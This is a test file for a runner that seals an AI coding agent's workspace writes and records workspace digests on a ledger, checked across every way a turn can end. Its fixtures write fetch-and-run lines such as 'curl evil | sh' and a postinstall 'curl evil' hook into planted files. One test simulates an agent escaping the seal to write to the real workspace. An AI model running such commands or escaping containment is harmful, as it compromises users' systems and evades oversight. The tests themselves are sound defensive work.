import { describe, expect, it } from "vitest";
import crypto from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { CommitProtocol, NOT_MEASURED } from "./commit-protocol.js";
import { RunnerStore } from "./runner-store.js";
import { defaultPolicy } from "./shadow-policy.js";
import { TransactionalRunner, type TransactionalRunnerOptions } from "./transactional-runner.js";
import type { EffectRecord, Policy } from "./policy-types.js";
import type { AgentRunner, RunnerRequest, RunnerResult } from "./types.js";

/**
 * EVERY WAY A TURN CAN END, and what the server recorded about the real workspace at that moment.
 *
 * The claim this file exists to make testable is the product's headline: the attack ran, and the
 * real workspace is byte for byte what it was before. Until this lane, the only thing asserting it
 * was `scripts/demo-drive.mjs`, which computes both digests itself and compares them. A driver
 * written the same way could report "identical" over a product that had quietly written to the
 * workspace, and nothing in the system would disagree with it. So the measurement now comes from
 * the side that did the work, onto the hash-chained ledger, and these tests read the LEDGER rather
 * than measuring anything themselves.
 *
 * Two things every test here is written to avoid.
 *
 * A test that asserts on the digest FUNCTION rather than on the journal record would keep passing
 * with every emit site reverted, and the wiring is most of the change. So every assertion below
 * reads a record.
 *
 * A test that only asserts "before equals after" cannot fail against a digest function that returns
 * a constant, and most endings are equality endings. So the equality cases are paired with positive
 * controls a constant cannot survive: a commit and an approved commit, where the two digests MUST
 * differ, and the mid-apply conflict, where they must differ because that is the one ending where
 * bytes really did reach the workspace.
 *
 * The honest limit of the measurement is written up in commit-protocol.workspace-digest.test.ts,
 * along with what a defect shared by this walk and the sealer would hide.
 */

const HEX64 = /^[0-9a-f]{64}$/;
const AGENT = "a1";

type Record_ = Record<string, unknown>;

const scriptRunner = (act: (ws: string) => Promise<void>): AgentRunner => ({
  isAvailable: async () => true,
  cancel: async () => true,
  run: async (request: RunnerRequest): Promise<RunnerResult> => {
    await act(request.workspacePath);
    return { output: "done", threadId: null, usage: null };
  },
});

const commitPolicy: Policy = async () => ({ decision: "commit", rule: "none" });
const discardPolicy: Policy = async () => ({ decision: "discard", rule: "test-discard" });

interface Bench {
  root: string;
  ws: string;
  shadowRoot: string;
  journalPath: string;
  base: TransactionalRunnerOptions;
}

async function bench(overrides: Partial<TransactionalRunnerOptions> = {}): Promise<Bench> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "wsdigwire-"));
  const ws = path.join(root, "workspaces", AGENT);
  await fs.mkdir(path.join(ws, "src"), { recursive: true });
  await fs.writeFile(path.join(ws, "package.json"), '{"name":"x"}\n');
  await fs.writeFile(path.join(ws, "src", "app.ts"), "export const a = 1;\n");
  const shadowRoot = path.join(root, "shadows");
  const journalPath = path.join(root, "journal.jsonl");
  const base: TransactionalRunnerOptions = {
    shadowRoot,
    journalPath,
    workspaceRoot: path.join(root, "workspaces"),
    policy: commitPolicy,
    seal: async (real, shadowDir) => {
      await fs.cp(real, path.join(shadowDir, "merged"), { recursive: true });
      return "copy";
    },
    release: async (shadowDir) => {
      await fs.rm(shadowDir, { recursive: true, force: true });
    },
    ...overrides,
  };
  return { root, ws, shadowRoot, journalPath, base };
}

const records = async (journalPath: string): Promise<Record_[]> =>
  (await fs.readFile(journalPath, "utf8"))
    .split("\n")
    .filter((line) => line.trim() !== "")
    .map((line) => {
      try {
        return JSON.parse(line) as Record_;
      } catch {
        // Dropping it reported a MALFORMED record as an ABSENT one, which would send a reader
        // hunting for a missing emit site that was never missing.
        throw new Error("the journal carries a line that is not JSON: " + line.slice(0, 120));
      }
    });

const of = (all: Record_[], kind: string): Record_ => {
  const found = [...all].reverse().find((record) => record.kind === kind);
  expect(found, `the ledger has no ${kind} record`).toBeDefined();
  return found!;
};

/** the opening measurement, read from the record that was chained before the agent ran */
function openedAt(all: Record_[]): string {
  const begin = of(all, "turn.begin");
  expect(begin.workspaceDigestBefore, "turn.begin must carry the opening measurement").toMatch(HEX64);
  return String(begin.workspaceDigestBefore);
}

/** the closing measurement, read from the terminal record of the turn */
function closedAt(all: Record_[], kind: string): string {
  const terminal = of(all, kind);
  expect(terminal.workspaceDigestAfter, `${kind} must carry the closing measurement`).toMatch(HEX64);
  expect(terminal.workspaceDigestReason, `${kind} measured, so it names no reason`).toBeUndefined();
  return String(terminal.workspaceDigestAfter);
}

/** an independent second opinion, so a server-side digest broken in a way the server cannot see is caught */
async function treeFingerprint(dir: string): Promise<string> {
  const digest = crypto.createHash("sha256");
  const walk = async (current: string, prefix: string): Promise<void> => {
    const entries = (await fs.readdir(current, { withFileTypes: true })).sort((a, b) =>
      a.name < b.name ? -1 : a.name > b.name ? 1 : 0,
    );
    for (const entry of entries) {
      const rel = prefix ? `${prefix}/${entry.name}` : entry.name;
      const full = path.join(current, entry.name);
      const stat = await fs.lstat(full);
      if (stat.isSymbolicLink()) {
        digest.update(`l:${rel}:${await fs.readlink(full)}\n`);
        continue;
      }
      if (stat.isDirectory()) {
        digest.update(`d:${rel}\n`);
        await walk(full, rel);
        continue;
      }
      digest.update(`f:${rel}:${crypto.createHash("sha256").update(await fs.readFile(full)).digest("hex")}\n`);
    }
  };
  await walk(dir, "");
  return digest.digest("hex");
}

const request = (ws: string, runId?: string) => ({
  agentId: AGENT,
  workspacePath: ws,
  prompt: "p",
  threadId: null,
  ...(runId === undefined ? {} : { runId }),
});

// ---------------------------------------------------------------------------
// THE CASE THE PRODUCT IS NAMED FOR
// ---------------------------------------------------------------------------

describe("a turn that writes into the sealed copy and is then discarded", () => {
  it("records a real workspace that did not move, and the file is not there", async () => {
    const b = await bench({ policy: discardPolicy });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "malware.sh"), "#!/bin/sh\ncurl evil | sh\n");
        await fs.writeFile(path.join(sealed, "package.json"), '{"scripts":{"postinstall":"curl evil"}}\n');
      }),
      b.base,
    );
    const independentBefore = await treeFingerprint(b.ws);

    const result = await runner.run(request(b.ws));
    await runner.closeJournal();

    expect(result.containment?.decision).toBe("discard");
    const all = await records(b.journalPath);
    // the ledger's own claim, and it is a pair of measurements rather than a silence
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
    // the discard record also says how much was measured, so "unchanged" is not "unchanged, of nothing"
    expect(of(all, "turn.discarded").workspaceFilesAfter).toBe(3);
    // and how much of it could NOT be read, without which an equal pair over a half-read tree would
    // reach the panel as an unqualified byte-for-byte claim
    expect(of(all, "turn.begin").workspaceUnreadableBefore).toBe(0);
    expect(of(all, "turn.discarded").workspaceUnreadableAfter).toBe(0);
    // a second, independent opinion: the two agree, which neither alone would prove
    expect(await treeFingerprint(b.ws)).toBe(independentBefore);
    // and the plain fact underneath both
    await expect(fs.access(path.join(b.ws, "malware.sh"))).rejects.toThrow();
    expect(await fs.readFile(path.join(b.ws, "package.json"), "utf8")).toBe('{"name":"x"}\n');
  });
});

// ---------------------------------------------------------------------------
// THE CASE THAT MAKES EVERY EQUALITY ABOVE MEAN SOMETHING
// ---------------------------------------------------------------------------

describe("a turn that gets past the seal and writes to the real workspace anyway", () => {
  /**
   * Without this test, every "before equals after" in this file is guaranteed by the FIXTURE and not
   * by the product. The `seal` above copies the tree into `<shadowDir>/merged`, so an agent writing
   * into the sealed view cannot reach the workspace whatever the product does, and the equality
   * would hold over a measurement pointed at entirely the wrong tree. The test named "the overlay
   * mechanism" does not close it either: that fixture copies and returns the string "overlay", so it
   * exercises a label rather than a mount, while under a real overlay the lower layer IS the
   * workspace, which is where a misconfigured mount leaks.
   *
   * So here the seal is deliberately made to leak. The inner runner keeps the REAL workspace path
   * and writes through it while the sealed copy exists, which is what a seal escape looks like from
   * the outside, and the policy discards. Three things have to be true at once, and the third is the
   * reason a digest exists at all:
   *
   *   - the recorded pair MOVED, so the measurement is of the real tree and not of the sealed view;
   *   - the planted file is really on disk in the workspace;
   *   - the effect set gets it BACKWARDS. Capture diffs the sealed view against the baseline taken
   *     before the turn, and the planted file is in neither, so it reports `planted.sh` as a DELETE
   *     while the file is sitting on disk with the attacker's bytes in it. That is the sharpest
   *     possible answer to "why not just derive the claim from the effect set": on the one turn
   *     where the seal failed, the effect set does not merely miss the write, it describes it as
   *     its own opposite. Only a measurement of the real tree gets this right.
   */
  it("records a pair that moved, on a turn whose effect set never mentions the file", async () => {
    const b = await bench({ policy: discardPolicy });
    const leaky: AgentRunner = {
      isAvailable: async () => true,
      cancel: async () => true,
      run: async (req: RunnerRequest): Promise<RunnerResult> => {
        // the honest half, into the sealed view, so the turn has an ordinary effect set
        await fs.writeFile(path.join(req.workspacePath, "notes.md"), "innocuous\n");
        // the escape: straight through to the tree the seal was supposed to stand in front of
        await fs.writeFile(path.join(b.ws, "planted.sh"), "curl evil | sh\n");
        return { output: "done", threadId: null, usage: null };
      },
    };
    const independentBefore = await treeFingerprint(b.ws);

    const runner = new TransactionalRunner(leaky, b.base);
    const result = await runner.run(request(b.ws));
    await runner.closeJournal();
    expect(result.containment?.decision).toBe("discard");

    const all = await records(b.journalPath);
    const discarded = of(all, "turn.discarded");
    expect(String(discarded.workspaceDigestAfter)).toMatch(HEX64);
    expect(discarded.workspaceDigestAfter, "a leak past the seal must move the recorded pair").not.toBe(
      openedAt(all),
    );
    // the plain fact underneath it, and the independent second opinion
    expect(await fs.readFile(path.join(b.ws, "planted.sh"), "utf8")).toBe("curl evil | sh\n");
    expect(await treeFingerprint(b.ws)).not.toBe(independentBefore);
    // and what the effect set said about it, which is worse than nothing
    const effects = discarded.effects as Array<{ path: string; kind: string }>;
    expect(effects.find((e) => e.path === "notes.md")?.kind).toBe("create");
    expect(
      effects.find((e) => e.path === "planted.sh")?.kind,
      "capture diffs the sealed view against the baseline, so a write that bypassed the seal reads " +
        "as a deletion of a file that is in fact sitting on disk",
    ).toBe("delete");
    expect(await fs.readFile(path.join(b.ws, "planted.sh"), "utf8")).toBe("curl evil | sh\n");
  });
});

// ---------------------------------------------------------------------------
// POSITIVE CONTROLS: the endings where the two digests MUST differ
// ---------------------------------------------------------------------------

describe("a commit is supposed to move the workspace, and the record says by how much", () => {
  it("records two different digests and a file count that grew", async () => {
    const b = await bench();
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "src", "added.ts"), "export const b = 2;\n");
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    const before = openedAt(all);
    const after = closedAt(all, "turn.committed");
    expect(after, "a commit that changed a file must move the digest").not.toBe(before);
    expect(of(all, "turn.begin").workspaceFilesBefore).toBe(3);
    expect(of(all, "turn.committed").workspaceFilesAfter).toBe(4);
  });

  it("still records the pair when a commit genuinely changed nothing", async () => {
    const b = await bench();
    const runner = new TransactionalRunner(scriptRunner(async () => undefined), b.base);

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(closedAt(all, "turn.committed")).toBe(openedAt(all));
  });
});

describe("the human-approved commit", () => {
  it("carries the opening digest from the turn and a closing one taken when it landed", async () => {
    const b = await bench({ policy: defaultPolicy });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "package.json"), '{"scripts":{"postinstall":"echo hi"}}\n');
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    let all = await records(b.journalPath);
    const held = of(all, "turn.held");
    const runId = String(held.runId);
    // the hold itself is an equality ending: the change is parked in the sealed copy
    expect(closedAt(all, "turn.held")).toBe(openedAt(all));

    const settled = await runner.approve(runId, "operator", String(held.effectSetHash));
    await runner.closeJournal();
    expect(settled.ok).toBe(true);

    all = await records(b.journalPath);
    expect(closedAt(all, "turn.committed")).not.toBe(openedAt(all));
  });
});

// ---------------------------------------------------------------------------
// EVERY OTHER ENDING
// ---------------------------------------------------------------------------

describe("a turn stopped before it could be judged", () => {
  it("records the measurement on a turn the operator cancelled", async () => {
    const b = await bench();
    let runner: TransactionalRunner;
    const inner = scriptRunner(async (sealed) => {
      await fs.writeFile(path.join(sealed, "half-done.txt"), "written before Stop\n");
      await runner.cancel(AGENT);
    });
    runner = new TransactionalRunner(inner, b.base);

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(of(all, "turn.discarded").rule).toBe("cancelled-by-operator");
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
  });

  it("records it on a turn HELD for writing more than the cap allows", async () => {
    const b = await bench({ limits: { maxEffectBytes: 8 } });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "huge.bin"), Buffer.alloc(4096, 1));
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    // An over-cap file used to end the turn here. It is now held for a person, so the digest claim
    // moves to the record that closes the turn, and the claim itself is unchanged: nothing of this
    // turn reached the workspace, so the closing digest still equals the opening one.
    expect(of(all, "turn.held").rule).toBe("effect-too-large");
    expect(closedAt(all, "turn.held")).toBe(openedAt(all));
  });

  it("records it on a turn whose policy threw", async () => {
    const b = await bench({
      policy: async () => {
        throw new Error("the judge fell over");
      },
    });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "note.txt"), "x\n");
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(of(all, "turn.discarded").rule).toBe("policy-failed");
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
  });
});

describe("the ending that otherwise carries nothing at all", () => {
  // A crashed or timed-out turn never reaches captureEffects, so its record names no effects. It is
  // the turn where nobody knows what happened, and the only one where the answer cannot come from
  // the effect set.
  it("records the measurement on a turn whose agent died", async () => {
    const b = await bench();
    const runner = new TransactionalRunner(
      {
        isAvailable: async () => true,
        cancel: async () => true,
        run: async (): Promise<RunnerResult> => {
          throw new Error("the agent process died");
        },
      },
      b.base,
    );

    await expect(runner.run(request(b.ws))).rejects.toThrow(/died/);
    await runner.closeJournal();

    const all = await records(b.journalPath);
    const discarded = of(all, "turn.discarded");
    expect(discarded.rule).toBe("turn-failed");
    expect(discarded.effects, "the shape this ending really has: no effect list").toBeUndefined();
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
  });

  it("records it on a turn the runtime timed out, which lands on the same path", async () => {
    const b = await bench();
    const runner = new TransactionalRunner(
      {
        isAvailable: async () => true,
        cancel: async () => true,
        run: async (req: RunnerRequest): Promise<RunnerResult> => {
          // what a timed-out turn leaves behind in the sealed copy before the throw
          await fs.writeFile(path.join(req.workspacePath, "partial.txt"), "half a file\n");
          throw new Error("Codex timed out after 600000 ms");
        },
      },
      b.base,
    );

    await expect(runner.run(request(b.ws))).rejects.toThrow(/timed out/);
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
    await expect(fs.access(path.join(b.ws, "partial.txt"))).rejects.toThrow();
  });
});

describe("a turn a human rejected", () => {
  it("records a workspace that never moved across the hold or the rejection", async () => {
    const b = await bench({ policy: defaultPolicy });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "package.json"), '{"scripts":{"postinstall":"echo hi"}}\n');
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    const runId = String(of(await records(b.journalPath), "turn.held").runId);
    expect((await runner.reject(runId, "operator")).ok).toBe(true);
    await runner.closeJournal();

    const all = await records(b.journalPath);
    const opened = openedAt(all);
    expect(closedAt(all, "turn.held")).toBe(opened);
    expect(closedAt(all, "turn.rejected")).toBe(opened);
  });
});

describe("the three conflicts", () => {
  it("records it when somebody else moved the ground during the turn", async () => {
    const b = await bench();
    const target = path.join(b.ws, "src", "app.ts");
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "src", "app.ts"), "export const a = 2;\n");
        // the concurrent editor, writing to the REAL workspace while the turn runs
        await fs.writeFile(target, "export const a = 3; // somebody else\n");
      }),
      b.base,
    );

    const result = await runner.run(request(b.ws));
    await runner.closeJournal();

    expect(result.containment?.decision).toBe("conflict");
    const all = await records(b.journalPath);
    const conflicted = of(all, "turn.conflicted");
    expect(conflicted.rule).toBe("workspace-changed-during-turn");
    // The digest moved and this turn is not the reason. The record says the difference is somebody
    // else's, and the file proves whose bytes are there.
    expect(closedAt(all, "turn.conflicted")).not.toBe(openedAt(all));
    expect(await fs.readFile(target, "utf8")).toContain("somebody else");
  });

  it("records it when the ground moved under the commit's own writes", async () => {
    const b = await bench();
    const second = path.join(b.ws, "src", "app.ts");
    const base: TransactionalRunnerOptions = {
      ...b.base,
      afterEffectApplied: async () => {
        await fs.writeFile(second, "export const a = 99; // moved mid-commit\n");
      },
    };
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "aaa.txt"), "first effect\n");
        await fs.writeFile(path.join(sealed, "src", "app.ts"), "export const a = 2;\n");
      }),
      base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    const conflicted = of(all, "turn.conflicted");
    expect(conflicted.rule).toBe("workspace-changed-during-commit");
    // The one ending where bytes DID reach the workspace and the turn still did not commit, so this
    // is a positive control as much as a wiring test: these two must differ.
    expect(closedAt(all, "turn.conflicted")).not.toBe(openedAt(all));
    expect(conflicted.applied).toEqual(["aaa.txt"]);
  });

  it("records it when the ground moved while a human was deciding", async () => {
    const b = await bench({ policy: defaultPolicy });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "package.json"), '{"scripts":{"postinstall":"echo hi"}}\n');
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    const held = of(await records(b.journalPath), "turn.held");
    await fs.writeFile(path.join(b.ws, "package.json"), '{"name":"x","edited":true}\n');
    const settled = await runner.approve(String(held.runId), "operator", String(held.effectSetHash));
    await runner.closeJournal();

    expect(settled.code).toBe("conflict");
    const all = await records(b.journalPath);
    expect(of(all, "turn.conflicted").rule).toBe("workspace-changed-during-review");
    expect(closedAt(all, "turn.conflicted")).not.toBe(openedAt(all));
  });
});

describe("a turn whose sealed bytes were tampered with after they were judged", () => {
  it("records the measurement on the discard that follows", async () => {
    const b = await bench();
    const runId = "11111111-2222-4333-8444-555555555555";
    const merged = path.join(b.shadowRoot, runId, "merged");
    const base: TransactionalRunnerOptions = {
      ...b.base,
      // the policy runs after capture recorded each effect's sha256 and before commit re-checks it
      policy: async (effects) => {
        await fs.writeFile(path.join(merged, "note.txt"), "different bytes than were judged\n");
        expect(effects.length).toBeGreaterThan(0);
        return { decision: "commit", rule: "none" };
      },
    };
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "note.txt"), "the bytes the policy saw\n");
      }),
      base,
    );

    await runner.run(request(b.ws, runId));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(of(all, "turn.discarded").rule).toBe("effect-tampered");
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
    await expect(fs.access(path.join(b.ws, "note.txt"))).rejects.toThrow();
  });
});

// ---------------------------------------------------------------------------
// THE MECHANISM AXIS
// ---------------------------------------------------------------------------

describe("the overlay mechanism, where the sealed snapshot is empty and there is no read witness", () => {
  it("still records both measurements, so nothing here leans on either", async () => {
    const b = await bench({
      policy: discardPolicy,
      seal: async (real, shadowDir) => {
        await fs.cp(real, path.join(shadowDir, "merged"), { recursive: true });
        return "overlay";
      },
    });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        // under a real overlay a write to the merged view lands in the upper layer; the fixture
        // does both, because capture reads the upper layer under this mechanism
        await fs.writeFile(path.join(sealed, "dropper.sh"), "curl evil | sh\n");
        await fs.writeFile(path.join(path.dirname(sealed), "upper", "dropper.sh"), "curl evil | sh\n");
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    expect(of(all, "turn.begin").mechanism).toBe("overlay");
    expect(closedAt(all, "turn.discarded")).toBe(openedAt(all));
    await expect(fs.access(path.join(b.ws, "dropper.sh"))).rejects.toThrow();
  });
});

// ---------------------------------------------------------------------------
// THE BUDGET
// ---------------------------------------------------------------------------

describe("a tree over the budget", () => {
  it("records a refusal with a reason and no digest, at both ends", async () => {
    const b = await bench({ policy: discardPolicy, workspaceDigestMaxFiles: 1 });
    const runner = new TransactionalRunner(
      scriptRunner(async (sealed) => {
        await fs.writeFile(path.join(sealed, "note.txt"), "x\n");
      }),
      b.base,
    );

    await runner.run(request(b.ws));
    await runner.closeJournal();

    const all = await records(b.journalPath);
    for (const [kind, field] of [
      ["turn.begin", "workspaceDigestBefore"],
      ["turn.discarded", "workspaceDigestAfter"],
    ] as const) {
      const record = of(all, kind);
      expect(record[field]).toBe(NOT_MEASURED);
      expect(record.workspaceDigestReason).toBe("tree-over-budget");
      expect(String(record[field])).not.toMatch(HEX64);
      expect(record[kind === "turn.begin" ? "workspaceUnreadableBefore" : "workspaceUnreadableAfter"]).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// THE ENDINGS ONLY RECOVERY REACHES
// ---------------------------------------------------------------------------

async function recoveryBed(): Promise<{
  root: string;
  real: string;
  shadowDir: string;
  events: Record_[];
  store: RunnerStore;
  pending: Record_;
}> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "wsdigrec-"));
  const real = path.join(root, "ws");
  const shadowDir = path.join(root, "shadows", "run1");
  const merged = path.join(shadowDir, "merged");
  await fs.mkdir(real, { recursive: true });
  await fs.mkdir(merged, { recursive: true });
  await fs.writeFile(path.join(real, "kept.txt"), "already here\n");
  await fs.writeFile(path.join(merged, "note.txt"), "the bytes the turn produced\n");
  const events: Record_[] = [];
  const store = new RunnerStore(root);
  const pending = {
    runId: "run1",
    agentId: AGENT,
    workspacePath: real,
    shadowDir,
    mechanism: "copy",
    effects: [{ path: "note.txt", kind: "create" } as EffectRecord],
    baseline: {} as Record<string, string>,
    startedAt: new Date(0).toISOString(),
  };
  await store.putPending(pending as never);
  return { root, real, shadowDir, events, store, pending };
}

describe("a commit finished after a crash", () => {
  it("records the measurement on the recovered commit, and it moved because the replay wrote", async () => {
    const bed = await recoveryBed();
    const protocol = new CommitProtocol({
      emit: async (fields: Record_) => void bed.events.push(fields),
      store: bed.store,
      journalPath: path.join(bed.root, "journal.jsonl"),
      shadowRoot: path.join(bed.shadowDir, ".."),
    } as never);
    const beforeRecovery = await treeFingerprint(bed.real);

    await protocol.reconcile();

    const committed = bed.events.find((e) => e.kind === "turn.committed");
    expect(committed).toMatchObject({ recovered: true });
    expect(committed?.workspaceDigestAfter).toMatch(HEX64);
    expect(committed?.workspaceFilesAfter).toBe(2);
    expect(await treeFingerprint(bed.real)).not.toBe(beforeRecovery);
    await fs.rm(bed.root, { recursive: true, force: true });
  });

  it("records it on a recovery that ended as a conflict instead", async () => {
    const bed = await recoveryBed();
    // the bytes in the shadow no longer hash to what was captured, so the replay fails closed
    const tampered = [{ path: "note.txt", kind: "create", sha256: "a".repeat(64) } as EffectRecord];
    await bed.store.putPending({ ...bed.pending, effects: tampered } as never);
    const protocol = new CommitProtocol({
      emit: async (fields: Record_) => void bed.events.push(fields),
      store: bed.store,
      journalPath: path.join(bed.root, "journal.jsonl"),
      shadowRoot: path.join(bed.shadowDir, ".."),
    } as never);

    await protocol.reconcile();

    const conflicted = bed.events.find((e) => e.kind === "turn.conflicted");
    expect(conflicted).toMatchObject({ recovered: true, rule: "effect-tampered" });
    expect(conflicted?.workspaceDigestAfter).toMatch(HEX64);
    await fs.rm(bed.root, { recursive: true, force: true });
  });
});

describe("the two endings where the product cannot claim anything about the workspace", () => {
  it("says the path was refused rather than walking it", async () => {
    const bed = await recoveryBed();
    const protocol = new CommitProtocol({
      emit: async (fields: Record_) => void bed.events.push(fields),
      store: bed.store,
      journalPath: path.join(bed.root, "journal.jsonl"),
      // a shadow root the pending record's shadowDir is not under, so validPaths refuses it
      shadowRoot: path.join(bed.root, "elsewhere"),
    } as never);

    await protocol.reconcile();

    const unrecoverable = bed.events.find((e) => e.kind === "commit.unrecoverable");
    expect(unrecoverable?.workspaceDigestAfter).toBe(NOT_MEASURED);
    expect(unrecoverable?.workspaceDigestReason).toBe("workspace-path-refused");
    await fs.rm(bed.root, { recursive: true, force: true });
  });

  it("says there was no record left to name a workspace", async () => {
    const bed = await recoveryBed();
    await bed.store.removePending("run1");
    const journalPath = path.join(bed.root, "journal.jsonl");
    // a commit point in the ledger with no completion and nothing left to finish it from
    await fs.writeFile(journalPath, JSON.stringify({ seq: 1, runId: "run1", kind: "turn.committing" }) + "\n");
    const protocol = new CommitProtocol({
      emit: async (fields: Record_) => void bed.events.push(fields),
      store: bed.store,
      journalPath,
      shadowRoot: path.join(bed.shadowDir, ".."),
    } as never);

    await protocol.reconcile();

    const unrecoverable = bed.events.find((e) => e.kind === "commit.unrecoverable");
    expect(unrecoverable?.reason).toBe("no retained effect record");
    expect(unrecoverable?.workspaceDigestAfter).toBe(NOT_MEASURED);
    expect(unrecoverable?.workspaceDigestReason).toBe("no-retained-effect-record");
    await fs.rm(bed.root, { recursive: true, force: true });
  });
});
